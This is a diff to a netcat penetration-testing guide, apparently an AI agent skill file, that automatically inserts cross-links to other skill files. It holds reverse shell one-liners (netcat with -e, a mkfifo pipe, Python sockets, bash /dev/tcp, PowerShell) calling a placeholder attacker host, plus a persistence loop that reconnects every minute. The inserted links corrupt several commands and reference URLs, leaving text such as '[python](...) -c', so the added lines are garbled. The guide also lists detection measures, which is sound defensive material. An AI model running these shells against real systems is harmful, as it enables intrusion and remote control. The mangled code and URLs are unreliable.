@@ -117,10 +117,10 @@ timeout 2 nc <target-ip> <port>
 **Service-specific banner grabbing**:
 
 ```bash
-# MySQL banner
+# [MySQL](../../Backend/mysql/SKILL.md) banner
 nc <target-ip> 3306
 
-# PostgreSQL banner
+# [PostgreSQL](../../Backend/postgresql/SKILL.md) banner
 nc <target-ip> 5432
 
 # SMB/CIFS banner
@@ -178,8 +178,8 @@ nc <attacker-ip> 4444 -e /bin/bash
 # If -e not available (OpenBSD netcat)
 rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker-ip> 4444 > /tmp/f
 
-# Python reverse shell
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker-ip>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+# [Python](../../Languages/python/SKILL.md) reverse shell
+[python](../../Languages/python/SKILL.md) -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker-ip>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
 
 # Bash reverse shell
 bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1
@@ -194,8 +194,8 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<attacker
 **Upgrade reverse shell to interactive TTY**:
 
 ```bash
-# Python PTY upgrade
-python -c 'import pty; pty.spawn("/bin/bash")'
+# [Python](../../Languages/python/SKILL.md) PTY upgrade
+[python](../../Languages/python/SKILL.md) -c 'import pty; pty.spawn("/bin/bash")'
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 # Background shell with Ctrl+Z, then:
@@ -344,7 +344,7 @@ nc <host1-ip> 6666
 - **Egress Filtering**: Outbound connections may be blocked
 - **Port Selection**: Use common ports (80, 443, 53) to blend with normal traffic
 
-### Audit Logging
+### [Audit](../../../AI_and_Agents/Operations/audit/SKILL.md) Logging
 
 Document all netcat activities:
 - Connection timestamps and duration
@@ -528,7 +528,7 @@ while true; do nc <attacker-ip> 4444 -e /bin/bash 2>/dev/null; sleep 60; done
 **Solutions**:
 ```bash
 # Upgrade to PTY shell
-python -c 'import pty; pty.spawn("/bin/bash")'
+[python](../../Languages/python/SKILL.md) -c 'import pty; pty.spawn("/bin/bash")'
 
 # Set terminal type
 export TERM=xterm
@@ -542,8 +542,8 @@ stty raw -echo; fg
 
 Organizations can detect netcat activity by:
 
-- **Process Monitoring**: Detect nc/ncat process execution
-- **Network Monitoring**: Unusual outbound connections to non-standard ports
+- **Process [Monitoring](../../../DevOps_and_Cloud/Observability_and_SecOps/monitoring/SKILL.md)**: Detect nc/ncat process execution
+- **Network [Monitoring](../../../DevOps_and_Cloud/Observability_and_SecOps/monitoring/SKILL.md)**: Unusual outbound connections to non-standard ports
 - **Command-Line Auditing**: Monitor for -e flag usage
 - **Traffic Analysis**: Unencrypted shell traffic patterns
 - **File Integrity**: Detect unauthorized netcat binaries
@@ -553,14 +553,14 @@ Enhance defensive posture:
 - Monitor for process execution from unusual locations
 - Deploy EDR solutions to detect reverse shell patterns
 - Enable egress filtering on firewalls
-- Audit Sysmon Event ID 1 (Process Creation) for nc/ncat
+- [Audit](../../../AI_and_Agents/Operations/audit/SKILL.md) Sysmon Event ID 1 (Process Creation) for nc/ncat
 - Detect named pipe creation (Linux: mkfifo)
 - Monitor cron jobs and systemd services for suspicious entries
 
 ## References
 
 - [Ncat Users' Guide](https://nmap.org/ncat/guide/index.html)
-- [GTFOBins: netcat](https://gtfobins.github.io/gtfobins/nc/)
+- [GTFOBins: netcat](https://gtfobins.[github](../../../DevOps_and_Cloud/CI_CD/github/SKILL.md).io/gtfobins/nc/)
 - [MITRE ATT&CK: Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)
 - [PTES: Post Exploitation](http://www.pentest-standard.org/index.php/Post_Exploitation)
-- [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+- [Reverse Shell Cheat Sheet](https://[github](../../../DevOps_and_Cloud/CI_CD/github/SKILL.md).com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
